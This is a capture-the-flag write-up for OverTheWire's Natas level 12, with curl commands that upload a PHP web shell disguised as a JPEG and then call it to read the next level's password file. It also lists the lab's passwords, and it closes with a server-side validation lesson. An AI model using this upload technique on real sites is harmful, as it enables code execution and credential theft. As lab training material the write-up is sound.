# Natas Level 12 to 13

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 12 -> 13 |
| Status | Complete |

## Objective

Upload executable PHP despite the form claiming to accept JPEG files.

## Given Access

User: `natas12`

Password:

```text
yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

## Method

The server derives the stored extension from the client-controlled `filename` field and does not validate file contents. Upload a small PHP file while setting `filename=shell.php`, then request the uploaded path.

## Commands

```bash
printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > shell.php

resp=$(curl -s -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB \
  -F 'MAX_FILE_SIZE=1000' \
  -F 'filename=shell.php' \
  -F 'uploadedfile=@shell.php;type=image/jpeg' \
  http://natas12.natas.labs.overthewire.org/)

path=$(printf '%s' "$resp" | sed -n 's/.*href="\([^"]*\.php\)".*/\1/p')
curl -s -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB \
  "http://natas12.natas.labs.overthewire.org/$path"
```

## Result

Password for `natas13`:

```text
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

## Lesson

Client-provided filenames and extensions are untrusted. Upload handlers must enforce type and storage policy server-side.

## References

- https://overthewire.org/wargames/natas/
